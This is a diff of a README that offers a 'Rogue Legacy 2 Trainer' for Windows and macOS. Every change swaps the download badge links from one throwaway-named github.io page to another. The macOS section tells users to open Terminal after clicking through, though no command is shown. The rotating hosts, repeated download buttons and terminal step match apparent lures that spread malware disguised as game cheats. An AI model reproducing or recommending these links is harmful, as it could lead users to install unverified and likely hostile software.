@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Download Rogue Legacy 2 Trainer](https://img.shields.io/badge/⬇_Download_Rogue%20Legacy%202_Trainer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Download Rogue Legacy 2 Trainer](https://img.shields.io/badge/⬇_Download_Rogue%20Legacy%202_Trainer-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
 
 </div>
 
@@ -78,9 +78,9 @@ Rogue Legacy 2 is the acclaimed sequel to the beloved roguelite where your desce
 
 <div align="center">
 
-[![Download Trainer for Windows](https://img.shields.io/badge/Download_Trainer_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://spearsurvive.github.io/win/)
+[![Download Trainer for Windows](https://img.shields.io/badge/Download_Trainer_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
 
-[![Download Trainer for macOS](https://img.shields.io/badge/Download_Trainer_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://spearsurvive.github.io/mac/)
+[![Download Trainer for macOS](https://img.shields.io/badge/Download_Trainer_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
 
 </div>
 
@@ -101,7 +101,7 @@ Rogue Legacy 2 is the acclaimed sequel to the beloved roguelite where your desce
 
 <div align="center">
 
-[![⬇ Download Rogue Legacy 2 Trainer](https://img.shields.io/badge/⬇_Download_Rogue%20Legacy%202_Trainer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Download Rogue Legacy 2 Trainer](https://img.shields.io/badge/⬇_Download_Rogue%20Legacy%202_Trainer-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
 
 </div>
 
@@ -133,7 +133,7 @@ Rogue Legacy 2 is the acclaimed sequel to the beloved roguelite where your desce
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://spearsurvive.github.io/mac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
 
 1. Click the badge above to open the macOS trainer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -158,7 +158,7 @@ Rogue Legacy 2 is the acclaimed sequel to the beloved roguelite where your desce
 
 <div align="center">
 
-[![⬇ Download Rogue Legacy 2 Trainer](https://img.shields.io/badge/⬇_Download_Rogue%20Legacy%202_Trainer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Download Rogue Legacy 2 Trainer](https://img.shields.io/badge/⬇_Download_Rogue%20Legacy%202_Trainer-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
 
 </div>
 
